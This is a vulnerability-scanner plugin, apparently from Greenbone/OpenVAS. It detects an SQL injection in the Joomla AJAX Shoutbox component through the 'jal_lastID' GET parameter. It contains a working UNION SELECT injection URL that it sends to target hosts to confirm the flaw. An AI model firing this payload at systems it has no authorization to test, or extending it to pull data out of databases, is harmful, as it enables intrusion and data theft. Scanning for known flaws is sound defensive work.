# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804338");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-03-18 10:00:07 +0530 (Tue, 18 Mar 2014)");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Joomla Component AJAX Shoutbox SQL Injection Vulnerability");

  script_tag(name:"summary", value:"Joomla! component ajax shoutbox is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
possible to execute sql query or not.");

  script_tag(name:"insight", value:"The flaw is due to insufficient validation of 'jal_lastID' HTTP GET
parameter passed to 'index.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to inject or manipulate SQL
queries in the back-end database, allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Joomla AJAX Shoutbox version 1.6 and probably earlier.");

  script_tag(name:"solution", value:"Upgrade to Joomla AJAX Shoutbox version 1.7 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/57450");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/66261");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/32331");
  script_xref(name:"URL", value:"http://extensions.joomla.org/extensions/communication/shoutbox/43");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/joomla-ajax-shoutbox-sql-injection");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125721/Joomla-AJAX-Shoutbox-SQL-Injection.html");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://batjo.nl/shoutbox");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if (!http_port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:http_port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/?mode=getshouts&jal_lastID=1337133713371337+union+select+c" +
             "oncat(0x673716C2D696E6A656374696F6E2D74657374),1,1,1,1,1";

if (http_vuln_check(port: http_port, url: url, check_header: TRUE, pattern: "sql-injection-test")) {
  report = http_report_vuln_url(port: http_port, url: url);
  security_message(port: http_port, data: report);
  exit(0);
}

exit(99);
